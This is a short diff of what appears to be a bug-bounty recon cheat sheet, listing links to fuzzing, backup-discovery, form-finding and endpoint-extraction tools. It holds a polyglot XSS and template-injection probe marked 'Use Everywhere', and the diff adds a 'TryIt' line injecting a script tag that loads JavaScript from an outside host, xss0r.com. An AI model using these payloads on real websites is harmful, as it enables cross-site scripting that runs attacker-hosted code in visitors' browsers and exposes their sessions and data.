@@ -8,7 +8,6 @@
 >> https://raw.githubusercontent.com/coffinxp/lostfuzzer/refs/heads/main/lostfuzzer.sh
 >> https://raw.githubusercontent.com/Dheerajmadhukar/back-me-up/refs/heads/main/backmeup.sh
 
-
 >> https://github.com/Bo0oM/fuzz.txt/blob/master/fuzz.txt
 
 
@@ -21,6 +20,8 @@ https://github.com/dirtycoder0124/form_finder/tree/main
 https://github.com/yogsec/endpoints-extractor/tree/main
 
 Use Everywhere: '"><svg/onload=prompt(7);>{{7*7}}
+
+TryIt: <script src="https://xss0r.com/Resources/xss0r.js"></script>
 
 Inject Payload:
 ---------------
